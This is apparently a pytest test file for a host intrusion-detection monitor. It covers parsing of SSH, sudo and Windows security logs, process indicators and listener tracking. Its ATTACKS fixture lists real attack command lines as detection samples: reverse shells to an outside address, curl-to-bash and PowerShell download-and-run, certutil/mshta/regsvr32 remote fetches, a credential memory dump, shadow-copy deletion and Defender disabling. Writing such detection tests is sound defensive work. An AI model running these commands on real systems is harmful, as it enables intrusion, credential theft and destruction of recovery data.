import collections
import copy
import datetime as dt
import json
import os
import socket
import subprocess
import sys
import time

import psutil
import pytest

from collectors import auth_parsers, host_monitor, log_monitor, windows_events
from collectors.auth_parsers import journal_entry_events, line_events, parse_syslog
from collectors.host_monitor import (
    ListenerWatcher,
    MetricsSampler,
    ProcessWatcher,
    is_exposed,
    listener_changes,
    snapshot_listeners,
)
from collectors.process_checks import ProcessFacts, inspect, load_indicators
from common.runtime import METRIC_FIELDS, ConfigError, read_recent_jsonl, utc_now

NOW = dt.datetime(2026, 11, 7, 12, 0, tzinfo=dt.timezone.utc)


def one(line):
    events = line_events(line, NOW)
    assert len(events) == 1, events
    return events[0]


SSH = "Nov  7 10:00:00 h sshd[1]: "


# ----------------------------------------------------------------- syslog lines
def test_failed_password():
    event = one(SSH + "Failed password for root from 203.0.113.5 port 5555 ssh2")
    assert (event["type"], event["ip"], event["user"], event["port"]) == ("auth_fail", "203.0.113.5", "root", 5555)


def test_invalid_user():
    assert one(SSH + "Failed password for invalid user admin from 203.0.113.6 port 1 ssh2")["user"] == "admin"


def test_username_with_spaces():
    assert one(SSH + "Failed password for invalid user a b c from 203.0.113.8 port 1 ssh2")["user"] == "a b c"


def test_ipv6_source():
    assert one(SSH + "Failed password for root from 2001:db8::5 port 1 ssh2")["ip"] == "2001:db8::5"


def test_address_inside_a_username_is_ignored():
    # Regression: logging in as "x from 8.8.8.8 port 1" got 8.8.8.8 blocked.
    line = SSH + "Failed password for invalid user x from 8.8.8.8 port 1 ssh2 from 203.0.113.7 port 2 ssh2"
    assert one(line)["ip"] == "203.0.113.7"


@pytest.mark.parametrize(
    "line",
    [
        "Invalid user x from 8.8.8.8 port 1 from 203.0.113.7 port 2",
        "Connection closed by invalid user x 8.8.8.8 port 1 [preauth] 203.0.113.7 port 2 [preauth]",
        "error: maximum authentication attempts exceeded for invalid user x from 8.8.8.8 port 1 ssh2 from 203.0.113.7 port 2 ssh2 [preauth]",
    ],
)
def test_address_inside_a_username_is_ignored_on_every_line_type(line):
    assert one(SSH + line)["ip"] == "203.0.113.7"


@pytest.mark.parametrize(
    "line",
    [
        "Nov  7 10:00:00 h sudo:  alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/echo Failed password for root from 8.8.8.8 port 22 ssh2",
        "Nov  7 10:00:00 h myapp[9]: Failed password for root from 8.8.4.4 port 22 ssh2",
        "Nov  7 10:00:00 h cron[9]: Accepted password for root from 8.8.4.4 port 22 ssh2",
    ],
)
def test_other_programs_cannot_pose_as_sshd(line):
    # Regression: any line containing the right words produced an auth event, so a
    # local user could get any address blocked with `sudo echo`.
    assert [e for e in line_events(line, NOW) if e["type"].startswith("auth_")] == []


def test_a_sudo_command_cannot_fake_an_account_creation():
    line = "Nov  7 10:00:01 h sudo:  alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/echo useradd[1]: new user: name=ghost, UID=0, GID=0"
    assert [e["type"] for e in line_events(line, NOW)] == ["sudo_exec"]


def test_a_failure_with_trailing_text_is_refused():
    assert line_events(SSH + "Failed password for root from 8.8.8.8 port 1 ssh2 tail", NOW) == []


def test_repeated_message_counts_every_attempt():
    # Regression: "message repeated 4 times" counted as one failure.
    events = line_events(SSH + "message repeated 4 times: [ Failed password for root from 203.0.113.9 port 1 ssh2]", NOW)
    assert [event["ip"] for event in events] == ["203.0.113.9"] * 4


def test_repeat_count_cannot_explode():
    line = SSH + "message repeated 999999999 times: [ Failed password for root from 203.0.113.9 port 1 ssh2]"
    assert len(line_events(line, NOW)) == auth_parsers.MAX_REPEATS


def test_public_key_login():
    event = one(SSH + "Accepted publickey for alice from 203.0.113.11 port 1 ssh2: RSA SHA256:abc")
    assert (event["type"], event["user"]) == ("auth_success", "alice")


def test_newer_openssh_program_name():
    assert one("Nov  7 10:00:00 h sshd-session[5]: Failed password for root from 203.0.113.1 port 1 ssh2")


@pytest.mark.parametrize(
    "message, kind, ip",
    [
        ("Invalid user oracle from 203.0.113.20 port 41000", "invalid_user", "203.0.113.20"),
        ("Connection closed by authenticating user root 203.0.113.21 port 1 [preauth]", "preauth_close", "203.0.113.21"),
        ("Disconnected from invalid user bob 203.0.113.21 port 1 [preauth]", "preauth_close", "203.0.113.21"),
        ("error: maximum authentication attempts exceeded for root from 203.0.113.22 port 1 ssh2 [preauth]", "max_attempts", "203.0.113.22"),
        ("Did not receive identification string from 203.0.113.26 port 1", "scanner", "203.0.113.26"),
        ("Unable to negotiate with 203.0.113.23 port 1: no matching key exchange method found.", "scanner", "203.0.113.23"),
    ],
)
def test_attacks_on_key_only_servers_are_seen(message, kind, ip):
    # Regression: none of these produced an event, so a server that only accepts keys
    # appeared never to be attacked at all.
    event = one(SSH + message)
    assert (event["type"], event["meta"]["kind"], event["ip"]) == ("auth_probe", kind, ip)


def test_probes_are_kept_apart_from_guesses():
    # sshd logs both for one attempt, and a guess must not count twice.
    assert one(SSH + "Invalid user x from 203.0.113.1 port 1")["type"] != "auth_fail"


def test_sudo_failures_count_each_attempt():
    line = "Nov  7 10:00:08 h sudo:  alice : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/bash"
    assert [e["type"] for e in line_events(line, NOW)] == ["sudo_fail"] * 3


def test_a_sudo_command_cannot_fake_a_failure():
    line = "Nov  7 10:00:08 h sudo:  alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/echo 3 incorrect password attempts ;"
    assert [e["type"] for e in line_events(line, NOW)] == ["sudo_exec"]


def test_sudo_denied():
    line = "Nov  7 10:00:08 h sudo:  alice : user NOT in sudoers ; TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/bash"
    assert one(line)["type"] == "sudo_denied"


def test_su_failure():
    line = "Nov  7 10:00:09 h su: pam_unix(su:auth): authentication failure; logname=bob uid=1000 euid=0 tty=pts/0 ruser=bob rhost=  user=root"
    event = one(line)
    assert (event["type"], event["user"], event["meta"]["by"]) == ("su_fail", "root", "bob")


def test_useradd_fields():
    event = one("Nov  7 10:00:08 h useradd[42]: new user: name=evil, UID=0, GID=0, home=/root, shell=/bin/bash, from=none")
    assert event["type"] == "user_add" and event["user"] == "evil"
    assert event["meta"]["uid"] == 0 and event["meta"]["shell"] == "/bin/bash"


def test_uid_changed_to_zero():
    event = one("Nov  7 10:00:10 h usermod[7]: change user 'bob' UID from '1000' to '0'")
    assert (event["type"], event["meta"]["new_uid"]) == ("user_mod", 0)


@pytest.mark.parametrize(
    "line",
    [
        "Nov  7 10:00:11 h usermod[7]: add 'bob' to group 'sudo'",
        "Nov  7 10:00:11 h gpasswd[7]: user bob added by root to group sudo",
    ],
)
def test_group_additions(line):
    event = one(line)
    assert (event["type"], event["user"], event["meta"]["group"]) == ("group_add", "bob", "sudo")


def test_crontab_change_and_password_change():
    assert one("Nov  7 10:00:11 h crontab[7]: (alice) REPLACE (alice)")["type"] == "cron_change"
    assert one("Nov  7 10:00:11 h passwd[7]: pam_unix(passwd:chauthtok): password changed for root")["user"] == "root"


@pytest.mark.parametrize("line", ["", "garbage", "Nov 99 10:00:00 h sshd[1]: x", SSH + "Server listening on 0.0.0.0 port 22."])
def test_lines_that_mean_nothing_produce_nothing(line):
    assert line_events(line, NOW) == []


def test_long_lines_are_capped():
    event = one(SSH + "Failed password for invalid user " + "x" * 5000 + " from 203.0.113.1 port 1 ssh2")
    assert len(event["msg"]) <= auth_parsers.MAX_MESSAGE


# ---------------------------------------------------------------------- timestamps
def test_event_time_comes_from_the_log():
    # A catch-up after downtime must look old, or the stale guard cannot recognise it.
    assert one("2026-11-07T10:00:00+05:30 h sshd[1]: Failed password for root from 203.0.113.1 port 1 ssh2")["ts"] == "2026-11-07T04:30:00Z"


def test_traditional_stamp_is_local_time():
    event = one(SSH + "Failed password for root from 203.0.113.1 port 1 ssh2")
    expected = dt.datetime(2026, 11, 7, 10, 0).astimezone(dt.timezone.utc)
    assert event["ts"] == expected.strftime("%Y-%m-%dT%H:%M:%SZ")


def test_december_line_read_in_january_is_last_year():
    january = dt.datetime(2027, 1, 1, 12, 0, tzinfo=dt.timezone.utc)
    assert parse_syslog("Dec 31 11:00:00 h sshd[1]: x", january).when.year == 2026


def test_a_future_stamp_is_pulled_back_to_now():
    assert parse_syslog("2030-01-01T00:00:00Z h sshd[1]: x", NOW).when == NOW


def test_leap_day_in_a_normal_year_is_rejected():
    assert parse_syslog("Feb 29 10:00:00 h sshd[1]: x", NOW) is None


# ------------------------------------------------------------------------- journal
REAL = {
    "SYSLOG_IDENTIFIER": "sshd", "_COMM": "sshd", "_UID": "0", "_HOSTNAME": "h",
    "MESSAGE": "Failed password for root from 203.0.113.40 port 1 ssh2",
    "__REALTIME_TIMESTAMP": "1794041570205774",
}


def test_genuine_journal_entry():
    event = journal_entry_events(REAL, NOW + dt.timedelta(days=9000))[0]
    assert event["ip"] == "203.0.113.40"
    assert event["ts"].startswith("2026-")


@pytest.mark.parametrize(
    "change",
    [
        {"_COMM": "logger", "_UID": "0"},
        {"_COMM": "logger", "_UID": "1000"},
        {"_COMM": "sshd", "_UID": "1000"},  # a copy of logger renamed sshd
    ],
)
def test_forged_journal_entries_are_rejected(change):
    # Measured on a real journal: `logger -t sshd` is recorded with _COMM=logger and
    # the sender's real uid, whatever it claims to be.
    assert journal_entry_events({**REAL, **change}, NOW) == []


def test_journal_entry_from_the_newer_sshd_process():
    assert journal_entry_events({**REAL, "SYSLOG_IDENTIFIER": "sshd-session", "_COMM": "sshd-session"}, NOW)


def test_entry_is_accepted_when_the_process_exited_before_journald_read_its_name():
    entry = {key: value for key, value in REAL.items() if key != "_COMM"}
    assert journal_entry_events(entry, NOW)


def test_journal_message_stored_as_bytes():
    assert journal_entry_events({**REAL, "MESSAGE": list(REAL["MESSAGE"].encode())}, NOW)


def test_sudo_keeps_working_in_the_journal():
    entry = {"SYSLOG_IDENTIFIER": "sudo", "_COMM": "sudo", "_UID": "1000",
             "MESSAGE": "alice : user NOT in sudoers ; TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/bash"}
    assert journal_entry_events(entry, NOW)[0]["type"] == "sudo_denied"


def test_journal_command_resumes_from_the_cursor():
    # Regression: --follow implies --lines=10, so anything past ten lines of downtime
    # was silently lost. Measured on a real journal: 13 entries, 10 delivered.
    command = log_monitor.journal_command("abc")
    assert "--after-cursor=abc" in command and "--lines=all" in command
    assert "--lines=0" in log_monitor.journal_command(None)


# --------------------------------------------------------------- choosing a source
def test_explicit_auth_log_wins(tmp_path, monkeypatch):
    log = tmp_path / "auth.log"
    log.write_text("", encoding="utf-8")
    monkeypatch.setattr(log_monitor, "WINDOWS", False)
    monkeypatch.setenv("AUTH_LOG", str(log))
    assert log_monitor.pick_source({"collectors": {}}) == ("file", str(log))


def test_no_source_is_reported(monkeypatch):
    monkeypatch.setattr(log_monitor, "WINDOWS", False)
    monkeypatch.setenv("AUTH_LOG", "/nonexistent/auth.log")
    assert log_monitor.pick_source({"collectors": {}})[0] == "none"


def test_auth_source_can_be_turned_off():
    assert log_monitor.pick_source({"collectors": {"auth_source": "none"}})[0] == "none"


def test_windows_uses_the_event_log(monkeypatch):
    monkeypatch.setattr(log_monitor, "WINDOWS", True)
    assert log_monitor.pick_source({"collectors": {}})[0] == "windows"


# ---------------------------------------------------------------- following a file
def write(path, text):
    with path.open("a", encoding="utf-8") as handle:
        handle.write(text)


def fresh(ip="203.0.113.60"):
    stamp = utc_now().strftime("%Y-%m-%dT%H:%M:%SZ")
    return f"{stamp} h sshd[1]: Failed password for root from {ip} port 1 ssh2\n"


def test_history_in_the_log_is_not_news(paths, tmp_path):
    log = tmp_path / "auth.log"
    log.write_text(fresh(), encoding="utf-8")
    log_monitor.follow_file(str(log), paths, follow=False)
    assert not paths.events.exists() or paths.events.read_text(encoding="utf-8") == ""


def test_lines_written_during_downtime_are_read_on_return(paths, tmp_path):
    # Regression: `tail -n0` started at the end, so anything logged during a restart was lost.
    log = tmp_path / "auth.log"
    log.write_text("", encoding="utf-8")
    log_monitor.follow_file(str(log), paths, follow=False)
    write(log, fresh("203.0.113.61"))
    log_monitor.follow_file(str(log), paths, follow=False)
    assert read_recent_jsonl(paths.events)[0]["ip"] == "203.0.113.61"


def test_a_cleared_log_is_reported(paths, tmp_path):
    log = tmp_path / "auth.log"
    log.write_text("", encoding="utf-8")
    log_monitor.follow_file(str(log), paths, follow=False)
    write(log, fresh() * 3)
    log_monitor.follow_file(str(log), paths, follow=False)
    log.write_text("", encoding="utf-8")
    log_monitor.follow_file(str(log), paths, follow=False)
    assert read_recent_jsonl(paths.events)[-1]["type"] == "log_cleared"


def test_throughput_keeps_up_with_a_real_attack(paths, tmp_path):
    # Regression: the bash parser managed 175 lines a second.
    log = tmp_path / "auth.log"
    log.write_text("", encoding="utf-8")
    log_monitor.follow_file(str(log), paths, follow=False)
    write(log, fresh() * 5000)
    started = time.perf_counter()
    log_monitor.follow_file(str(log), paths, follow=False)
    assert 5000 / (time.perf_counter() - started) > 500


# ------------------------------------------------------------------ Windows events
def windows_xml(event_id, channel="Security", record=7, **data):
    fields = "".join(f"<Data Name='{key}'>{value}</Data>" for key, value in data.items())
    return (
        "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>"
        f"<EventID>{event_id}</EventID><TimeCreated SystemTime='2025-03-01T10:00:00.1234567Z'/>"
        f"<EventRecordID>{record}</EventRecordID><Channel>{channel}</Channel><Computer>PC</Computer>"
        f"</System><EventData>{fields}</EventData></Event>"
    )


def converted(event_id, channel="Security", **data):
    parsed = windows_events.parse_events(windows_xml(event_id, channel, **data))
    return windows_events.to_sentinel_event(parsed[0])


def test_windows_failed_logon():
    event = converted(4625, TargetUserName="admin", IpAddress="203.0.113.5", LogonType="3")
    assert (event["type"], event["user"], event["ip"]) == ("auth_fail", "admin", "203.0.113.5")
    assert event["ts"] == "2025-03-01T10:00:00Z"


def test_windows_failed_logon_from_this_machine_has_no_address():
    assert "ip" not in converted(4625, TargetUserName="admin", IpAddress="-", LogonType="2")


def test_windows_remote_logon():
    event = converted(4624, TargetUserName="alice", IpAddress="203.0.113.5", LogonType="10")
    assert (event["type"], event["ip"]) == ("auth_success", "203.0.113.5")


@pytest.mark.parametrize(
    "data",
    [
        {"TargetUserName": "alice", "IpAddress": "-", "LogonType": "2"},
        {"TargetUserName": "alice", "IpAddress": "203.0.113.5", "LogonType": "5"},
        {"TargetUserName": "SYSTEM", "IpAddress": "203.0.113.5", "LogonType": "3"},
        {"TargetUserName": "PC$", "IpAddress": "203.0.113.5", "LogonType": "3"},
        {"TargetUserName": "alice", "IpAddress": "127.0.0.1", "LogonType": "3"},
    ],
)
def test_routine_windows_logons_are_ignored(data):
    # Windows logs thousands of these, and they say nothing about an attacker.
    assert converted(4624, **data) is None


def test_windows_user_created():
    event = converted(4720, TargetUserName="backdoor")
    assert (event["type"], event["user"]) == ("user_add", "backdoor")


def test_windows_added_to_administrators():
    event = converted(4732, TargetUserName="Administrators", MemberName="-", MemberSid="S-1-5-21-1")
    assert (event["type"], event["meta"]["group"], event["user"]) == ("group_add", "Administrators", "S-1-5-21-1")


def test_windows_log_cleared():
    assert converted(1102)["type"] == "log_cleared"
    assert converted(104, "System")["type"] == "log_cleared"


def test_windows_service_installed():
    event = converted(7045, "System", ServiceName="evil", ImagePath="C:\\Temp\\x.exe")
    assert event["type"] == "service_installed" and event["meta"]["service"] == "evil"


def test_windows_scheduled_task():
    assert converted(4698, TaskName="\\Updater")["meta"]["task"] == "\\Updater"


def test_defender_detection_and_tampering():
    channel = "Microsoft-Windows-Windows Defender/Operational"
    fields = {"Threat Name".replace(" ", "_"): "Trojan"}
    assert converted(5001, channel)["type"] == "defender_disabled"
    assert converted(1116, channel, **fields)["type"] == "malware_detected"


def test_unknown_windows_event_is_ignored():
    assert converted(9999) is None


def test_bad_windows_xml_gives_nothing():
    assert windows_events.parse_events("<not closed") == []
    assert windows_events.parse_events("") == []


def test_control_characters_do_not_break_windows_parsing():
    xml = windows_xml(4625, TargetUserName="a\x01b", IpAddress="203.0.113.5", LogonType="3")
    assert len(windows_events.parse_events(xml)) == 1


class FakeWindows:
    """Stands in for wevtutil."""

    ACCESS_DENIED = windows_events.ACCESS_DENIED
    CHANNELS = {"Security": (4625,), "System": (7045,)}
    to_sentinel_event = staticmethod(windows_events.to_sentinel_event)

    def __init__(self, denied=(), records=None):
        self.denied = denied
        self.records = records or {}

    def latest_record(self, channel):
        return (self.ACCESS_DENIED, 0) if channel in self.denied else (0, 100)

    def read_since(self, channel, ids, after):
        if channel in self.denied:
            return self.ACCESS_DENIED, []
        return 0, [item for item in self.records.get(channel, []) if item.record_id > after]


def windows_record(number, ip="203.0.113.5"):
    return windows_events.parse_events(
        windows_xml(4625, record=number, TargetUserName="a", IpAddress=ip, LogonType="3")
    )[0]


def test_windows_reader_starts_from_now_and_then_reads_what_is_new(paths, monkeypatch):
    fake = FakeWindows()
    monkeypatch.setattr(log_monitor, "windows_events", fake)
    reader = log_monitor.WindowsLogReader(paths)
    reader.poll()
    assert not paths.events.exists()

    fake.records = {"Security": [windows_record(101)]}
    reader.poll()
    reader.poll()
    assert [event["ip"] for event in read_recent_jsonl(paths.events)] == ["203.0.113.5"]


def test_windows_position_survives_a_restart(paths, monkeypatch):
    fake = FakeWindows(records={"Security": [windows_record(101)]})
    monkeypatch.setattr(log_monitor, "windows_events", fake)
    log_monitor.WindowsLogReader(paths).poll()
    log_monitor.WindowsLogReader(paths).poll()
    assert len(read_recent_jsonl(paths.events)) == 1


def test_a_log_that_needs_elevation_does_not_stop_the_others(paths, monkeypatch):
    # Measured on this project's Windows host: Security is denied without Administrator
    # while System and Defender can be read.
    fake = FakeWindows(denied=("Security",))
    monkeypatch.setattr(log_monitor, "windows_events", fake)
    reader = log_monitor.WindowsLogReader(paths)
    reader.poll()
    assert reader.readable() == ["System"]


def test_no_readable_log_at_all_means_unavailable(paths, monkeypatch):
    monkeypatch.setattr(log_monitor, "windows_events", FakeWindows(denied=("Security", "System")))
    assert log_monitor.follow_windows(paths, follow=False) == log_monitor.EXIT_UNAVAILABLE


# -------------------------------------------------------------------- process logic
@pytest.fixture
def indicators(config):
    return load_indicators(config)


def types_of(indicators, **facts):
    return [item["type"] for item in inspect(ProcessFacts(pid=5, **facts), indicators)]


def flags_of(indicators, **facts):
    found = inspect(ProcessFacts(pid=5, **facts), indicators)
    return found[0]["meta"]["flags"] if found else []


def test_shipped_indicators_load(indicators):
    assert len(indicators.commands) > 10


def test_ordinary_processes_are_left_alone(indicators):
    assert types_of(indicators, name="nginx", exe="/usr/sbin/nginx", cmdline=["nginx"]) == []
    assert types_of(indicators, name="bash", exe="/usr/bin/bash", cmdline=["-bash"], parent="sshd") == []


def test_miner_is_malicious_and_nmap_is_only_dual_use(indicators):
    assert flags_of(indicators, name="xmrig") == ["malicious"]
    assert flags_of(indicators, name="nmap") == ["name"]


def test_a_renamed_process_is_caught_by_its_file(indicators):
    assert flags_of(indicators, name="kworker", exe="/tmp/.x/xmrig") == ["malicious"]


def test_windows_names_are_normalised(indicators):
    assert flags_of(indicators, name="XMRig.exe", exe="C:\\Users\\a\\xmrig.exe", platform="win32") == ["malicious"]


def test_web_server_starting_a_shell(indicators):
    assert "webshell_spawn" in types_of(indicators, name="sh", exe="/usr/bin/dash", parent="nginx")
    assert "webshell_spawn" in types_of(indicators, name="cmd.exe", parent="w3wp.exe", platform="win32")


def test_ordinary_parents_of_a_shell_are_fine(indicators):
    assert "webshell_spawn" not in types_of(indicators, name="bash", parent="sshd")


def test_shell_on_a_socket_is_a_reverse_shell(indicators):
    assert "reverse_shell" in types_of(indicators, name="bash", socket_stdio=True)


def test_non_shell_on_a_socket_is_normal(indicators):
    assert "reverse_shell" not in types_of(indicators, name="nginx", socket_stdio=True)


def test_memory_only_process(indicators):
    assert types_of(indicators, name="x", exe="/memfd:x", from_memory=True) == ["fileless_process"]


def test_deleted_binary_outside_system_folders(indicators):
    assert types_of(indicators, name="x", exe="/home/a/x", exe_deleted=True) == ["deleted_binary"]


def test_package_upgrades_do_not_look_like_deleted_binaries(indicators):
    # Every running service looks deleted right after an upgrade.
    assert types_of(indicators, name="nginx", exe="/usr/sbin/nginx", exe_deleted=True) == []


def test_binary_in_a_temporary_folder(indicators):
    assert types_of(indicators, name="x", exe="/dev/shm/x") == ["temp_binary"]


def test_windows_installers_in_temp_are_fine(indicators):
    assert types_of(indicators, name="setup.exe", exe="C:\\Temp\\setup.exe", platform="win32") == []


ATTACKS = {
    "reverse_shell_dev_tcp": ["bash", "-c", "bash -i >& /dev/tcp/203.0.113.77/4444 0>&1"],
    "netcat_exec": ["nc", "-e", "/bin/sh", "203.0.113.77", "4444"],
    "socat_shell": ["socat", "tcp:203.0.113.77:4444", "exec:/bin/bash"],
    "scripted_reverse_shell": ["python3.11", "-c", "import socket,os;s=socket.socket();os.dup2(s.fileno(),0)"],
    "dev_tcp_connection": ["bash", "-c", "exec 3<>/dev/tcp/10.0.0.1/22"],
    "download_and_run": ["sh", "-c", "curl -s http://203.0.113.77/x.sh | bash"],
    "decode_and_run": ["sh", "-c", "echo aGk= | base64 -d | sh"],
    "history_wiped": ["sh", "-c", "unset HISTFILE"],
    "key_planted": ["sh", "-c", "echo ssh-rsa AAA >> /root/.ssh/authorized_keys"],
    "powershell_encoded": ["powershell.exe", "-nop", "-enc", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"],
    "powershell_download_run": ["powershell", "-c", "IEX (New-Object Net.WebClient).DownloadString('http://x')"],
    "certutil_download": ["certutil.exe", "-URLCache", "-f", "http://203.0.113.77/x.exe", "x.exe"],
    "bitsadmin_download": ["bitsadmin", "/transfer", "j", "http://x/y", "C:\\y"],
    "mshta_remote": ["mshta.exe", "http://203.0.113.77/x.hta"],
    "regsvr32_remote": ["regsvr32", "/s", "/n", "/u", "/i:http://203.0.113.77/x.sct", "scrobj.dll"],
    "rundll32_script": ["rundll32.exe", "javascript:\"\\..\\mshtml,RunHTMLApplication\""],
    "recovery_disabled": ["bcdedit", "/set", "{default}", "recoveryenabled", "No"],
    "event_log_cleared": ["wevtutil.exe", "cl", "Security"],
    "defender_turned_off": ["powershell", "Set-MpPreference", "-DisableRealtimeMonitoring", "$true"],
    "credential_dump": ["rundll32.exe", "comsvcs.dll,", "MiniDump", "624", "C:\\x.dmp", "full"],
    "shadow_copies_deleted": ["vssadmin.exe", "delete", "shadows", "/all", "/quiet"],
    "account_created_by_command": ["net", "user", "evil", "P@ss", "/add"],
}


@pytest.mark.parametrize("expected", ATTACKS)
def test_attack_commands_are_recognised(expected, indicators):
    found = inspect(ProcessFacts(pid=5, name="x", cmdline=ATTACKS[expected]), indicators)
    assert expected in [item["meta"].get("indicator") for item in found]


def test_every_shipped_indicator_has_an_attack_example(indicators):
    assert {item.id for item in indicators.commands} == set(ATTACKS)


@pytest.mark.parametrize(
    "cmdline",
    [
        ["grep", "-r", "/dev/tcp/1.2.3.4/80", "."],
        ["vim", "nc -e /bin/sh"],
        ["python3", "-m", "pytest"],
        ["powershell.exe", "-File", "C:\\scripts\\backup.ps1"],
        ["net", "user"],
        ["certutil", "-hashfile", "x.iso", "SHA256"],
        ["bash", "-c", "ls /tmp"],
        ["curl", "-O", "https://example.com/file.tgz"],
    ],
)
def test_ordinary_commands_are_not_attacks(cmdline, indicators):
    assert inspect(ProcessFacts(pid=5, name="x", cmdline=cmdline), indicators) == []


def test_a_finding_carries_its_technique(indicators):
    found = inspect(ProcessFacts(pid=5, name="x", cmdline=ATTACKS["certutil_download"]), indicators)
    assert found[0]["meta"]["mitre"] == ["T1105"]


@pytest.mark.parametrize(
    "content, message",
    [
        ("commands:\n  - {id: a, pattern: '(', confidence: medium}\n", "bad pattern"),
        ("commands:\n  - {id: a, pattern: 'x', confidence: high}\n", "must name its programs"),
        ("commands:\n  - {id: a, pattern: 'x', confidence: maybe}\n", "confidence"),
        ("commands:\n  - {pattern: 'x', confidence: high}\n", "duplicate indicator"),
        ("- nonsense\n", "must be a mapping"),
        ("a: [\n", "indicators.yml"),
    ],
)
def test_bad_indicator_files_are_rejected(tmp_path, config, content, message):
    path = tmp_path / "indicators.yml"
    path.write_text(content, encoding="utf-8")
    with pytest.raises(ConfigError, match=message):
        load_indicators(config, path)


# ------------------------------------------------------------------------ listeners
Address = collections.namedtuple("Address", "ip port")
Connection = collections.namedtuple("Connection", "type status laddr raddr pid")


def tcp(port, ip="0.0.0.0", pid=None, status=psutil.CONN_LISTEN):
    return Connection(socket.SOCK_STREAM, status, Address(ip, port), (), pid)


def udp(port, ip="0.0.0.0", raddr=()):
    return Connection(socket.SOCK_DGRAM, psutil.CONN_NONE, Address(ip, port), raddr, None)


def snapshot(*connections, ignored=frozenset()):
    return snapshot_listeners(list(connections), 49152, set(ignored))


def test_listeners_are_found():
    assert list(snapshot(tcp(8000))) == ["tcp|8000|0.0.0.0"]


def test_established_connections_are_not_listeners():
    assert snapshot(tcp(8000, status=psutil.CONN_ESTABLISHED)) == {}


def test_forked_workers_count_once():
    assert len(snapshot(tcp(8000), tcp(8000))) == 1


def test_udp_client_sockets_are_not_services():
    # Regression: every DNS or NTP client port looked like a new listener.
    assert snapshot(udp(54321)) == {}
    assert snapshot(udp(5353, raddr=Address("203.0.113.1", 53))) == {}
    assert list(snapshot(udp(5353))) == ["udp|5353|0.0.0.0"]


def test_a_high_tcp_port_is_still_reported():
    # A backdoor can pick any port.
    assert list(snapshot(tcp(50000))) == ["tcp|50000|0.0.0.0"]


def test_ignored_programs_are_skipped():
    assert snapshot(tcp(135, pid=os.getpid()), ignored={host_monitor.process_key(psutil.Process().name())}) == {}


@pytest.mark.parametrize(
    "address, exposed",
    [("127.0.0.1", False), ("::1", False), ("127.0.0.53%lo", False), ("0.0.0.0", True),
     ("::", True), ("192.168.1.5", True), ("not-an-address", True)],
)
def test_exposure(address, exposed):
    assert is_exposed(address) is exposed


def entry(proc="app", pid=1):
    return {"proto": "tcp", "port": 8000, "ip": "0.0.0.0", "pid": pid, "proc": proc, "exe": ""}


def test_new_listener_is_a_change():
    assert listener_changes({}, {"k": entry()}) == [entry()]


def test_a_restart_with_a_new_pid_is_not_a_change():
    assert listener_changes({"k": entry(pid=1)}, {"k": entry(pid=2)}) == []


def test_a_different_program_on_a_port_is_a_change():
    assert listener_changes({"k": entry("gunicorn")}, {"k": entry("evil")}) == [entry("evil")]


def test_first_run_is_a_silent_baseline(paths, config):
    # Regression: a first run reported every existing listener as new.
    ListenerWatcher(paths, config).scan([tcp(8000)])
    assert not paths.events.exists()


def test_a_new_listener_is_reported_after_the_baseline(paths, config):
    watcher = ListenerWatcher(paths, config)
    watcher.scan([tcp(8000)])
    watcher.scan([tcp(8000), tcp(9000, ip="127.0.0.1")])
    event = read_recent_jsonl(paths.events)[0]
    assert event["port"] == 9000 and event["meta"]["exposed"] is False


def test_the_bind_address_is_not_reported_as_a_source(paths, config):
    # Regression: a local address could be mistaken for an attacker.
    watcher = ListenerWatcher(paths, config)
    watcher.scan([])
    watcher.scan([tcp(9000, ip="10.0.0.5")])
    event = read_recent_jsonl(paths.events)[0]
    assert "ip" not in event and event["meta"]["bind_ip"] == "10.0.0.5"


def test_the_baseline_survives_a_restart(paths, config):
    ListenerWatcher(paths, config).scan([tcp(8000)])
    ListenerWatcher(paths, config).scan([tcp(8000)])
    assert not paths.events.exists()


# -------------------------------------------------------------------------- metrics
def test_metrics_have_a_header_and_every_column(paths):
    sampler = MetricsSampler(paths)
    sampler.record(5)
    lines = paths.metrics.read_text(encoding="utf-8").splitlines()
    assert lines[0] == ",".join(METRIC_FIELDS)
    assert len(lines[1].split(",")) == len(METRIC_FIELDS)


def test_a_restart_does_not_repeat_the_header(paths):
    MetricsSampler(paths)
    MetricsSampler(paths)
    assert len(paths.metrics.read_text(encoding="utf-8").splitlines()) == 1


def test_an_empty_metrics_file_gets_a_header(paths):
    # Regression: a headerless CSV lost its first data row.
    paths.metrics.write_text("", encoding="utf-8")
    MetricsSampler(paths)
    assert paths.metrics.read_text(encoding="utf-8").startswith("ts,")


def test_metrics_from_an_older_version_are_set_aside(paths):
    paths.metrics.write_text("ts,cpu_pct\n2025,1\n", encoding="utf-8")
    MetricsSampler(paths)
    assert paths.metrics.read_text(encoding="utf-8").startswith(",".join(METRIC_FIELDS))
    assert paths.metrics.with_name("resource_metrics.csv.old").exists()


# ------------------------------------------------------------------- real processes
@pytest.fixture
def sleeper():
    process = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])
    yield process
    process.kill()
    process.wait()


def watcher_for(paths, config, malicious=()):
    changed = copy.deepcopy(config)
    changed["collectors"]["malicious_names"] = list(malicious)
    return ProcessWatcher(paths, changed, load_indicators(changed))


def python_name():
    return host_monitor.process_key(psutil.Process().name())


def test_a_real_process_is_found_and_reported_once(paths, config, sleeper):
    watcher = watcher_for(paths, config, [python_name()])
    watcher.scan_new()
    watcher.scan_new()
    mine = [event for event in read_recent_jsonl(paths.events) if event["pid"] == sleeper.pid]
    assert len(mine) == 1
    assert mine[0]["meta"]["flags"] == ["malicious"]
    assert mine[0]["meta"]["exe"]


def test_a_process_started_later_is_found_on_the_next_look(paths, config):
    watcher = watcher_for(paths, config, [python_name()])
    watcher.scan_new()
    process = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])
    try:
        time.sleep(0.3)
        watcher.scan_new()
        assert process.pid in [event["pid"] for event in read_recent_jsonl(paths.events)]
    finally:
        process.kill()
        process.wait()


def test_the_monitor_does_not_report_itself(paths, config):
    watcher = watcher_for(paths, config, [python_name()])
    watcher.scan_new()
    assert os.getpid() not in [event["pid"] for event in read_recent_jsonl(paths.events)]


